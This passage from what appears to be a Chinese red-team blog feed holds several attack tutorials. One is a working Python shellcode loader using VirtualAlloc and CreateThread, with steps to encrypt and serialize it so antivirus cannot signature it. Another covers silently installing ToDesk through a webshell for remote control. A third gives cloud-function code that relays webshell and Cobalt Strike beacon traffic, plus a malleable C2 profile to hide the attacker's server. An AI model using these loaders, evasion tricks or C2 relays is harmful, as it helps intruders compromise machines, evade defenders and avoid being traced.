        <content type="html"><![CDATA[<h1 id="静态完全免杀思路"><a href="#静态完全免杀思路" class="headerlink" title="静态完全免杀思路"></a>静态完全免杀思路</h1><h2 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h2><p>使用python加载shellcode的方式现在也被各大AV记录到特征库中，代码打包成exe后，也马上被火绒kill。网上大多的免杀方式都是将特征的函数替换或者加密混淆，针对国内大部分AV来说还是非常有效的，但是很容易又被纳入到特征库中，这样又要耗费精力去测试做免杀。</p><p>那是否有简单且有效的方法来完全规避掉静态查杀呢？</p><p>如果每次代码都完全不一样的话，自然AV就没法做到识别其特征并记录在库，其实要实现这个并不难，只要对原代码做加密，每次密钥不同就能使最后的代码体也会不同。</p><h2 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a>实现方式</h2><p>我们先找一个常规的加载shellcode的代码，这里的shellcode只进行了一次base64的加密。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token punctuation">,</span>ctypes<span class="token punctuation">,</span>codecsshellcode <span class="token operator">=</span> <span class="token string">"XHhmY1x4NDhceDgzXHhlNFx4ZjBceGU4XHhjMFx4MDBceDAwXHgwMFx4NDFceDUxXHg0MVx4NTBceDUyXHg1MVx4NTZceDQ4XHgzMVx4ZDJceDY1XHg0OFx4OGJceDUyXHg2MFx4NDhceDhiXHg1Mlx4MThceDQ4XHg4Ylx4NTJceDIwXHg0OFx4OGJceDcyXHg1MFx4NDhceDBmXHhiN1x4NGFceDRhXHg0ZFx4MzFceGM5XHg0OFx4MzFceGMwXHhhY1x4M2NceDYxXHg3Y1x4MDJceDJjXHgyMFx4NDFceGMxXHhjOVx4MGRceDQxXHgwMVx4YzFceGUyXHhlZFx4NTJceDQxXHg1MVx4NDhceDhiXHg1Mlx4MjBceDhiXHg0Mlx4M2NceDQ4XHgwMVx4ZDBceDhiXHg4MFx4ODhceDAwXHgwMFx4MDBceDQ4XHg4NVx4YzBceDc0XHg2N1x4NDhceDAxXHhkMFx4NTBceDhiXHg0OFx4MThceDQ0XHg4Ylx4NDBceDIwXHg0OVx4MDFceGQwXHhlM1x4NTZceDQ4XHhmZlx4YzlceDQxXHg4Ylx4MzRceDg4XHg0OFx4MDFceGQ2XHg0ZFx4MzFceGM5XHg0OFx4MzFceGMwXHhhY1x4NDFceGMxXHhjOVx4MGRceDQxXHgwMVx4YzFceDM4XHhlMFx4NzVceGYxXHg0Y1x4MDNceDRjXHgyNFx4MDhceDQ1XHgzOVx4ZDFceDc1XHhkOFx4NThceDQ0XHg4Ylx4NDBceDI0XHg0OVx4MDFceGQwXHg2Nlx4NDFceDhiXHgwY1x4NDhceDQ0XHg4Ylx4NDBceDFjXHg0OVx4MDFceGQwXHg0MVx4OGJceDA0XHg4OFx4NDhceDAxXHhkMFx4NDFceDU4XHg0MVx4NThceDVlXHg1OVx4NWFceDQxXHg1OFx4NDFceDU5XHg0MVx4NWFceDQ4XHg4M1x4ZWNceDIwXHg0MVx4NTJceGZmXHhlMFx4NThceDQxXHg1OVx4NWFceDQ4XHg4Ylx4MTJceGU5XHg1N1x4ZmZceGZmXHhmZlx4NWRceDQ4XHhiYVx4MDFceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHg0OFx4OGRceDhkXHgwMVx4MDFceDAwXHgwMFx4NDFceGJhXHgzMVx4OGJceDZmXHg4N1x4ZmZceGQ1XHhiYlx4ZjBceGI1XHhhMlx4NTZceDQxXHhiYVx4YTZceDk1XHhiZFx4OWRceGZmXHhkNVx4NDhceDgzXHhjNFx4MjhceDNjXHgwNlx4N2NceDBhXHg4MFx4ZmJceGUwXHg3NVx4MDVceGJiXHg0N1x4MTNceDcyXHg2Zlx4NmFceDAwXHg1OVx4NDFceDg5XHhkYVx4ZmZceGQ1XHg2M1x4NjFceDZjXHg2M1x4MmVceDY1XHg3OFx4NjVceDAw"</span>shellcode <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>shellcode <span class="token operator">=</span>codecs<span class="token punctuation">.</span>escape_decode<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>shellcode <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>ctypes<span class="token punctuation">.</span>windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>VirtualAlloc<span class="token punctuation">.</span>restype <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>c_uint64ptr <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>VirtualAlloc<span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0x3000</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">)</span>buf <span class="token operator">=</span> <span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_char <span class="token operator">*</span> <span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>from_buffer<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>ctypes<span class="token punctuation">.</span>windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>RtlMoveMemory<span class="token punctuation">(</span>    ctypes<span class="token punctuation">.</span>c_uint64<span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span>    buf<span class="token punctuation">,</span>    ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>handle <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>CreateThread<span class="token punctuation">(</span>    ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    ctypes<span class="token punctuation">.</span>c_uint64<span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span>    ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    ctypes<span class="token punctuation">.</span>pointer<span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>ctypes<span class="token punctuation">.</span>windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>WaitForSingleObject<span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span>handle<span class="token punctuation">)</span><span class="token punctuation">,</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>很显然，如果直接将该py文件打包成exe，AV直接就kill掉了。</p><p>这里我们选择用python里面的Fernet模块对代码进行一个加密。</p><p>Fernet模块加密的过程，先生成一个随机密钥key，在用密钥key加密字符串str得到加密字符串b。</p><p><code>key = Fernet.generate_key()</code></p><p><code>b =Fernet(key).encrypt(str).decode()</code></p><p><img src="image-20211117234850901.png"></p><p>接下来写解密过程</p><p><code>b =Fernet(cipher_key).decrypt(fuck.encode()).decode()</code></p><p><img src="image-20211118084658816.png"></p><p>这时候我们原代码已经完全解密了出来，这时候附上exec执行即可</p><p><img src="image-20211118084956674.png"></p><p>这里换上C2的shellcode再打包，发现其已经过了火绒、360、安全狗。</p><p>但是这里我看<code>exec</code>不爽，再通过反序列化的方式进行加载执行。</p><p>在加密前先对原代码进行序列化操作。</p><p><img src="image-20211118092657856.png"></p><p>再对代码反序列化加载即可。</p><p><img src="image-20211118092806244.png"></p><h2 id="测试效果"><a href="#测试效果" class="headerlink" title="测试效果"></a>测试效果</h2><p>这里我也将其写成了生成的脚本（不过写的太烂不想拿出来丢人现眼了），将生成的payload.py打包成exe</p><p><img src="image-20211118093315074.png"></p><p><img src="image-20211118093500357.png"></p><p>这里过火绒、360、安全狗的图就不展示了。</p><h2 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h2><p>其实这里只是利用了一个加密和序列化来做到隐藏特征和让马子一次一个样子无法被AV记录特征，如果需要过def的话，就对shellcode进行异或等等的加密操作，通过这种方式可以让师傅们形形色色的免杀穿上一层外套，所以更多是一种思路。希望师傅们轻喷。</p>]]></content>
      
      
      <categories>
          
          <category> 免杀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Av </tag>
            
            <tag> 免杀技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Todesk的使用</title>
      <link href="/2021/11/07/todesk-de-shi-yong/"/>
      <url>/2021/11/07/todesk-de-shi-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="目标在出网情况下命令行安装ToDesk进行远程桌面"><a href="#目标在出网情况下命令行安装ToDesk进行远程桌面" class="headerlink" title="目标在出网情况下命令行安装ToDesk进行远程桌面"></a>目标在出网情况下命令行安装ToDesk进行远程桌面</h1><h2 id="下载软件安装包，上传到目标"><a href="#下载软件安装包，上传到目标" class="headerlink" title="下载软件安装包，上传到目标"></a>下载软件安装包，上传到目标</h2><p>点击进入—&gt;<a href="https://www.todesk.com/download.html">官网链接</a>—&gt;下载</p><p>使用蚁剑连接shell—&gt;上传安装包</p><p><img src="image-20211107194222582.png"></p><h2 id="静默安装"><a href="#静默安装" class="headerlink" title="静默安装"></a>静默安装</h2><p>在命令行中执行 ToDesk_Setup.exe /S</p><p><img src="image-20211107194341410.png"></p><h2 id="找到路径"><a href="#找到路径" class="headerlink" title="找到路径"></a>找到路径</h2><p>默认安装路径在    <strong>C:/Program Files (x86)/ToDesk/</strong></p><p>在此处打开命令行，验证是否安装成功</p><p><img src="image-20211107194401153.png"></p><h2 id="查看运行状态，连接目标"><a href="#查看运行状态，连接目标" class="headerlink" title="查看运行状态，连接目标"></a>查看运行状态，连接目标</h2><h3 id="查看设备代码"><a href="#查看设备代码" class="headerlink" title="查看设备代码"></a>查看设备代码</h3><p>同样在默认的安装路径打开命令行</p><p>查看设备代码 <strong>ToDesk.exe -getid</strong></p><p><img src="image-20211107195250208.png"></p><h3 id="设定安全密码"><a href="#设定安全密码" class="headerlink" title="设定安全密码"></a>设定安全密码</h3><p>ToDesk.exe -setpasswd password</p><p><img src="image-20211107195302858.png"></p><h3 id="打开todesk连接"><a href="#打开todesk连接" class="headerlink" title="打开todesk连接"></a>打开todesk连接</h3><p>遇到组策略禁止3389连接的时候使用这种方式，也算是一种另类的绕过了。</p><p><img src="image-20211107195502039.png"></p><h2 id="官方文档"><a href="#官方文档" class="headerlink" title="官方文档"></a>官方文档</h2><p><a href="http://www.str56.com/zh-CN/command#todeskexe-%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%8F%82%E6%95%B0">命令行参数</a></p><h2 id="杀后台常用命令"><a href="#杀后台常用命令" class="headerlink" title="杀后台常用命令"></a>杀后台常用命令</h2><p>tasklist</p><p>taskkill /PID 29908 -F -T</p>]]></content>
      
      
      <categories>
          
          <category> 红蓝对抗 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ToDesk </tag>
            
            <tag> 远程桌面 </tag>
            
            <tag> 命令行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>云函数的利用</title>
      <link href="/2021/11/05/yun-han-shu-de-li-yong/"/>
      <url>/2021/11/05/yun-han-shu-de-li-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="云函数的特点"><a href="#云函数的特点" class="headerlink" title="云函数的特点"></a>云函数的特点</h1><h2 id="云函数-SCF"><a href="#云函数-SCF" class="headerlink" title="云函数 SCF"></a>云函数 SCF</h2><p>云函数（Serverless Cloud  Function，SCF）是腾讯云为企业和开发者们提供的无服务器执行环境，能在无需购买和管理服务器的情况下运行代码。只需使用平台支持的语言编写核心代码并设置代码运行的条件，即可在腾讯云基础设施上弹性、安全地运行代码。SCF 是实时文件处理和数据处理等场景下理想的计算平台。</p><p>总结云函数的几个特性： 1. 多出口 2. 调用时创建执行 3. 无需服务器VPS承载</p><h1 id="云函数的几种常见利用"><a href="#云函数的几种常见利用" class="headerlink" title="云函数的几种常见利用"></a>云函数的几种常见利用</h1><h2 id="防溯源连接Webshell"><a href="#防溯源连接Webshell" class="headerlink" title="防溯源连接Webshell"></a>防溯源连接Webshell</h2><p>云函数使用的补上自己的ip，连接shell时调用云函数代理连接可以起到一定的防溯源效果。</p><h3 id="云函数创建-以腾讯云为例"><a href="#云函数创建-以腾讯云为例" class="headerlink" title="云函数创建(以腾讯云为例)"></a>云函数创建(以腾讯云为例)</h3><h4 id="基础配置"><a href="#基础配置" class="headerlink" title="基础配置"></a>基础配置</h4><p>进入云函数创建页面：<a href="https://console.cloud.tencent.com/scf/list-create?rid=4">腾讯云函数创建</a></p><p>选择自定义创建-&gt;写个函数名</p><p>​    <img src="image-20211103201441383.png"></p><h4 id="函数代码"><a href="#函数代码" class="headerlink" title="函数代码"></a>函数代码</h4><p>代码脚本如下，将webshell地址作为参数传入云函数api中。云函数服务端脚本会重组webshell地址以及POST命令内容，并把重组后的请求内容转发给webshell。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env</span><span class="token comment"># -*- coding: UTF-8 -*-</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> json <span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> urlsplit    <span class="token keyword">def</span> <span class="token function">geturl</span><span class="token punctuation">(</span>urlstr<span class="token punctuation">)</span><span class="token punctuation">:</span>    jurlstr <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>urlstr<span class="token punctuation">)</span>    dict_url <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>jurlstr<span class="token punctuation">)</span>    <span class="token keyword">return</span> dict_url<span class="token punctuation">[</span><span class="token string">'u'</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">main_handler</span><span class="token punctuation">(</span>event<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> geturl<span class="token punctuation">(</span>event<span class="token punctuation">[</span><span class="token string">'queryString'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    host <span class="token operator">=</span> urlsplit<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>netloc    postdata <span class="token operator">=</span> event<span class="token punctuation">[</span><span class="token string">'body'</span><span class="token punctuation">]</span>    headers<span class="token operator">=</span>event<span class="token punctuation">[</span><span class="token string">'headers'</span><span class="token punctuation">]</span>    headers<span class="token punctuation">[</span><span class="token string">"HOST"</span><span class="token punctuation">]</span> <span class="token operator">=</span> host    resp<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>postdata<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>        response<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"isBase64Encoded"</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span><span class="token string">"statusCode"</span><span class="token punctuation">:</span> <span class="token number">200</span><span class="token punctuation">,</span><span class="token string">"headers"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'text/html;charset='</span><span class="token operator">+</span>resp<span class="token punctuation">.</span>apparent_encoding<span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token string">"body"</span><span class="token punctuation">:</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> response<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>贴上代码即可</p><p><img src="image-20211103201819152.png"></p><h4 id="高级设置"><a href="#高级设置" class="headerlink" title="高级设置"></a>高级设置</h4><p>这里遇到一个坑，默认执行时间是三秒，如果不修改，执行函数将会有报错。</p><p>解决方案如下：</p><p>修改一下执行超时时间为60，其他保持默认</p><p>​    <img src="image-20211103202111021.png"></p><h4 id="触发器设置"><a href="#触发器设置" class="headerlink" title="触发器设置"></a>触发器设置</h4><p>保存后下滑点击触发器，设置触发方式为api网关触发(若报红，点击去授权服务，开启使用)</p><p>自定义创建-&gt;触发方式为API网关触发</p><p><img src="image-20211103202303211.png"></p><p>完成即可。</p><h3 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h3><p>完成后自动跳转到页面，或者点击 函数服务-&gt;函数名-&gt;触发管理</p><p>下滑复制<strong>访问路径</strong>，就是我们的api路径了</p><p><img src="image-20211103202411889.png"></p><p>搭建好后在蚁剑中直接使用 </p><p>或者在浏览器中访问该连接也能测试</p><pre class="line-numbers language-none"><code class="language-none">访问路径?u&#x3D;目标shell文件路径https:&#x2F;&#x2F;service-xxxxxxx.sh.apigw.tencentcs.com&#x2F;release&#x2F;shell-bypass?u&#x3D;http:&#x2F;&#x2F;xxx.xxx.xxx.xxx:端口&#x2F;upload&#x2F;1.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="image-20211103203426157.png"></p><p>这是就是调用腾讯云的api访问了，查看ip会发现每次请求的IP都不同，并且都是来自选择地的腾讯云。（比如本次实验就是上海的IP）</p><p><img src="image-20211103203558091.png"></p><p>放到微步可以查到它们都是干净的IP。</p><h2 id="云函数实现代理池"><a href="#云函数实现代理池" class="headerlink" title="云函数实现代理池"></a>云函数实现代理池</h2><p>云函数其实也可以作为一种变相的代理池供我们所用，利用云函数的多出口性来防止爆破或者SQL注入的时候被<strong>Ban</strong>掉ip。</p><h3 id="云函数创建"><a href="#云函数创建" class="headerlink" title="云函数创建"></a>云函数创建</h3><p>在github上查找scf-proxy可以找到开源的项目。第一次看到Scf-Proxy的概念的应该是学蚁致用的作者。通过客户端监听获取请求并且组装API请求，服务端云函数解析且重组API请求。通过SCF-Proxy不光可以实现代理http请求，也可以代理https请求(类似Burp中间人监听的方式)。</p><p><img src="image-20211103212150905.png"></p><h4 id="编译文件"><a href="#编译文件" class="headerlink" title="编译文件"></a>编译文件</h4><p>项目地址：<a href="https://github.com/Sakurasan/scf-proxy">https://github.com/Sakurasan/scf-proxy</a></p><p>下载文件放到linux中利用Golang编译客户端和服务端。</p><p>还是选择自定义创建，但是这里要选择Go，而不是默认的python，选择本地上传zip，将main.zip上传上去。</p><h4 id="上传服务端"><a href="#上传服务端" class="headerlink" title="上传服务端"></a>上传服务端</h4><p>上传编译的文件</p><p><img src="image-20211103212228998.png"></p><h4 id="触发器设置-1"><a href="#触发器设置-1" class="headerlink" title="触发器设置"></a>触发器设置</h4><p>API网关触发</p><p><img src="image-20211103212352424.png"></p><h3 id="客户端利用"><a href="#客户端利用" class="headerlink" title="客户端利用"></a>客户端利用</h3><p>编译后的文件如下，修改配置文件指向云函数的url，端口默认为8888，与服务端的一致，不做修改。</p><p><img src="image-20211105144631054.png"></p><p>在命令行运行windows的exe文件，开启代理</p><p><img src="image-20211105145016564.png"></p><p>目标使用个人的vps开启一个目录以供记录访问ip</p><p>python3 -m http.server 10081</p><p>在浏览器代理了本机的8888端口后访问vps开放的端口，可以发现有代理池的效果了。</p><p><img src="image-20211105150018051.png"></p><p>在平时渗透时就可以挂上这个代理防止自己的ip被ban掉。</p><h2 id="CS的Malleable-C2-Profiles隐藏"><a href="#CS的Malleable-C2-Profiles隐藏" class="headerlink" title="CS的Malleable-C2-Profiles隐藏"></a>CS的Malleable-C2-Profiles隐藏</h2><p>由于Cs支持HTTP/HTTPS类型的Beacon，因此我们也可以通过云函数来转发HTTP/HTTPS请求。</p><h3 id="云函数创建-1"><a href="#云函数创建-1" class="headerlink" title="云函数创建"></a>云函数创建</h3><h4 id="基础配置-1"><a href="#基础配置-1" class="headerlink" title="基础配置"></a>基础配置</h4><p>依旧选择自定义创建。<a href="https://console.cloud.tencent.com/scf/list-create?rid=4">腾讯云函数创建</a></p><p>​    <img src="image-20211103203916301.png"></p><h4 id="函数代码-1"><a href="#函数代码-1" class="headerlink" title="函数代码"></a>函数代码</h4><p>云函数服务端脚本如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf8 -*-</span><span class="token keyword">import</span> json<span class="token punctuation">,</span>requests<span class="token punctuation">,</span>base64<span class="token keyword">def</span> <span class="token function">main_handler</span><span class="token punctuation">(</span>event<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">:</span>    C2<span class="token operator">=</span><span class="token string">'http://&lt;C2服务器地址>'</span> <span class="token comment"># 这里可以使用 HTTP、HTTPS~下角标~</span>    path<span class="token operator">=</span>event<span class="token punctuation">[</span><span class="token string">'path'</span><span class="token punctuation">]</span>    headers<span class="token operator">=</span>event<span class="token punctuation">[</span><span class="token string">'headers'</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span>    <span class="token keyword">if</span> event<span class="token punctuation">[</span><span class="token string">'httpMethod'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'GET'</span> <span class="token punctuation">:</span>        resp<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>C2<span class="token operator">+</span>path<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>     <span class="token keyword">else</span><span class="token punctuation">:</span>        resp<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>C2<span class="token operator">+</span>path<span class="token punctuation">,</span>data<span class="token operator">=</span>event<span class="token punctuation">[</span><span class="token string">'body'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>headers<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>content<span class="token punctuation">)</span>    response<span class="token operator">=</span><span class="token punctuation">&#123;</span>        <span class="token string">"isBase64Encoded"</span><span class="token punctuation">:</span> <span class="token boolean">True</span><span class="token punctuation">,</span>        <span class="token string">"statusCode"</span><span class="token punctuation">:</span> resp<span class="token punctuation">.</span>status_code<span class="token punctuation">,</span>        <span class="token string">"headers"</span><span class="token punctuation">:</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>headers<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">"body"</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>resp<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> response<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20211103203948730.png"></p><h4 id="高级配置"><a href="#高级配置" class="headerlink" title="高级配置"></a>高级配置</h4><p>执行时间需要改，不然测试还是会有问题</p><p>建议改60</p><p><img src="image-20211103204010819.png"></p><h4 id="触发器配置"><a href="#触发器配置" class="headerlink" title="触发器配置"></a>触发器配置</h4><p>选API网关触发方式，其他默认</p><p><img src="image-20211103204058732.png"></p><h3 id="配置网关api路径"><a href="#配置网关api路径" class="headerlink" title="配置网关api路径"></a>配置网关api路径</h3><p>这里有一个坑，很多文章没有提到要更改网关路径，会直接导致cs无法上线。</p><p>解决方法如下：函数服务 -&gt; cs-bypass -&gt; 触发管理 -&gt; 点击API服务名</p><p>进入api服务，授权使用</p><p><img src="image-20211103204917775.png"></p><p>进入编辑</p><p><img src="image-20211103205045510.png"></p><p>路径改为 /</p><p><img src="image-20211103205112179.png"></p><p>在下方点击立即完成-&gt;发布任务 即可</p><h3 id="CS服务端配置"><a href="#CS服务端配置" class="headerlink" title="CS服务端配置"></a>CS服务端配置</h3><p>Cs可以定制Profile来更加隐匿流量 这里使用如下的Profile</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">set sample_name "kris_abao"; set sleeptime "3000";set jitter    "0";set maxdns    "255";set useragent "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)";http-get &#123;    set uri "/api/getit";    client &#123;        header "Accept" "*/*";        metadata &#123;            base64;            prepend "SESSIONID=";            header "Cookie";        &#125;    &#125;    server &#123;        header "Content-Type" "application/ocsp-response";        header "content-transfer-encoding" "binary";        header "Server" "Nodejs";        output &#123;            base64;            print;        &#125;    &#125;&#125;http-stager &#123;      set uri_x86 "/vue.min.js";    set uri_x64 "/bootstrap-2.min.js";&#125;http-post &#123;    set uri "/api/postit";    client &#123;        header "Accept" "*/*";        id &#123;            base64;            prepend "JSESSION=";            header "Cookie";        &#125;        output &#123;            base64;            print;        &#125;    &#125;    server &#123;        header "Content-Type" "application/ocsp-response";        header "content-transfer-encoding" "binary";        header "Connection" "keep-alive";        output &#123;            base64;            print;        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建完后放到将api.profile放到服务端Cs上 可以通过c2lint检查一下profile，可以看到正常的定义http类型Beacon的get和post请求时的样子。</p><p>可以使用c2lint检查一下 ./c2lint api.profile</p><p><img src="image-20211103211253353.png"></p><p>实战时指定一个配置文件进行加载</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;teamserver [external IP] [password] [&#x2F;path&#x2F;to&#x2F;my.profile]-------------.&#x2F;teamserver xxx.xxx.xxx.xxx 密码 api.profile如果不在同一个目录下，就写绝对路径<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="image-20211103211408739.png"></p><h3 id="验证成果"><a href="#验证成果" class="headerlink" title="验证成果"></a>验证成果</h3><p>设定监听</p><p><img src="image-20211103210032614.png"></p><p>使用该监听器生成木马-&gt;点击上线</p><p>使用wireshark验证ip，过滤一下请求uri：http.request.uri == “/api/getit”</p><p>uri通过查看服务端的api.profile配置文件得到。</p><p><img src="image-20211103211501489.png"></p><p>可以发现公网地址是我们的云函数IP，达到隐藏C2目的。</p><p><img src="image-20211103205834274.png"></p>]]></content>
      
      
      <categories>
          
          <category> 红蓝对抗 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web攻防 </tag>
            
            <tag> 防溯源 </tag>
            
            <tag> 云函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cs在不出网环境中上线</title>
      <link href="/2021/11/02/cs-zai-bu-chu-wang-huan-jing-zhong-shang-xian/"/>
      <url>/2021/11/02/cs-zai-bu-chu-wang-huan-jing-zhong-shang-xian/</url>
      
